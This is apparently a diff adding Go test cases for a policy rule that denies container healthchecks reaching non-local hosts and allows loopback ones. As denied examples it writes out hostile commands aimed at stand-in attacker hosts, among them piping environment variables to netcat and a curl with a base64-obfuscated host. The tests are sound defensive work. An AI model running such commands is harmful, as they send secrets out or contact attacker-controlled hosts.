@@ -175,6 +175,38 @@ var planCases = []planCase{
 		mutate: func(plan *ir.IR) {
 			plan.Services[0].Healthcheck.Test = []string{"CMD", "wget", "-qO-", "http://127.0.0.1:8080/healthcheck"}
 		}},
+	{name: "P6 healthcheck curl to a bare host denied", rule: "P6", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "curl -fsS evil.example/x"}
+		}},
+	{name: "P6 healthcheck wget to a bare IPv4 denied", rule: "P6", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "wget -qO- 192.0.2.1:8080/x"}
+		}},
+	{name: "P6 healthcheck piping to nc without spaces denied", rule: "P6", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "env|nc EVIL.example 9999"}
+		}},
+	{name: "P6 healthcheck network client with command substitution denied", rule: "P6", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "curl -s $(echo ZXZpbA== | base64 -d)"}
+		}},
+	{name: "P6 healthcheck curl to localhost by URL fine", rule: "P6", want: policy.OK,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "curl -fsS http://localhost:8080/health"}
+		}},
+	{name: "P6 healthcheck wget to a bare loopback fine", rule: "P6", want: policy.OK,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "wget -qO- 127.0.0.1:3000/"}
+		}},
+	{name: "P6 healthcheck script with a dotted name fine", rule: "P6", want: policy.OK,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD", "healthcheck.sh", "--connect", "--innodb_initialized"}
+		}},
+	{name: "P6 healthcheck dns query with substitution fine", rule: "P6", want: policy.OK,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "dig -p $$(pihole-FTL --config dns.port) +short @127.0.0.1 pi.hole || exit 1"}
+		}},
 	{name: "P6 benign command fine", rule: "P6", want: policy.OK,
 		mutate: func(plan *ir.IR) { plan.Services[0].Command = []string{"/usr/bin/miniflux", "-migrate"} }},
 
